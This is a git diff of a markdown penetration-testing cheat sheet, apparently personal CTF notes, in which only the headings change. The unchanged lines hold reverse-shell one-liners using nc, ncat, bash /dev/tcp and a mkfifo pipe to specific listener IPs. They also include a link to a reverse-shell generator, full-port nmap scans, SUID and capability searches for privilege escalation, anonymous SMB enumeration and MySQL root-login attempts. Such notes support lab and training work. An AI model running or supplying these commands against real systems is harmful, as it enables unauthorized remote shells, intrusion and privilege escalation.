@@ -1,11 +1,11 @@
-# Reverse_shell ✅
+# Reverse_Shell ✅
 ```bash
 nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
 /bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
-
+### [Other_Reverse_Shell_Site](https://www.revshells.com/)
 # Nmap_enumeration ✅
 ```bash
 sudo nmap -p- <ip> -sV -T5
@@ -19,7 +19,8 @@ getcap -r / 2>/dev/null
 find /  -perm -04000 -ls 2>/dev/null
 find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
 ```
-# SMB ✅
+# service ✅📚
+## SMB ✅
 ```bash
 enum4linux -a
 smbclient -L //<ip>/ -p <port>
@@ -28,14 +29,14 @@ smbclient //<ip>/<share dir>
 smbclient //<ip>/<share dir> -p <port>
 smbclient //<ip>/<share dir> -U Anonymous -p <port>
 ```
-# MySQL ✅
-## *enumeration ✡️
+## MySQL ✅
+### *enumeration ✡️
 ```bash
 mysql -u root
 mysql -u root -p
 mysql -h <Hostname> -u root
 ```
-## *MySQL commands ✡️
+### *MySQL commands ✡️
 ```mysql
 show databases;
 use <database>;
